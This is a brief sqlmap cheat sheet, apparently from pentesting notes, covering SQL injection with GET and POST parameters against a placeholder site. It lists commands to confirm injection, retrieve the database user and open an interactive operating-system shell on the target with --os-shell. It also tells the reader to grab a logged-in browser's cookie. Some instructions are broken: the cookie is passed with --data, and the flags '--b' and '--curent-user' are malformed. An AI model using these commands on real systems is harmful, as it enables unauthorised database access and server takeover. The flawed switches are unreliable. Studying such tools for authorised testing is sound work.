# [SQLmap](https://sqlmap.org/)

* Some Hints & Tricks
* GET Parameter Example
* POST Parameter Example

## Some Hints & Tricks

* You might need to define which type of database to atttack. Try to set `--dbms=[database type]`.
* If you need to test an authenticated SQL injection finding, log into the website via a browser and grab the Cookie. Then define the cookie using the `--data=[cookie]` switch.
* Stuck? Try the command: `sqlmap --wizard`.

## GET parameter example

* Finding if an SQL inject is valid (the result will be the banner if valid): `sqlmap -u "http://site.com/info.php?user=test&pass=test" -b`.
* Retrieving the database username: `sqlmap -u "http://site.com/info.php?user=test&pass=test" --current-user`.
* Interactive Shell: `sqlmap -u "http://site.com/info.php?user=test&pass=test" --os-shell`.

## POST parameter example

Instead of being in the URL as with GET injections, the POST parameters are passed in the data section.

This is normally seen with username and passwords as the web servers generally log GET parameters and you wouldn't want the webserver tyo log passwords. Also, there are size limitations with GET methods and therefore a lot of data will be passed via POST parameters for larger applications.

* Finding if an SQL inject is valid (the result will be the banner if valid): `sqlmap -u "http://site.com/info.php" --data="user=test&pass=test" --b`.
* Retrieving the database username: `sqlmap -u "http://site.com/info.php" --data="user=test&pass=test" --curent-user`.
* Interactive shell: `sqlmap -u "http://site.com/info.php" --data="user=test&pass=test" --os-shell`.
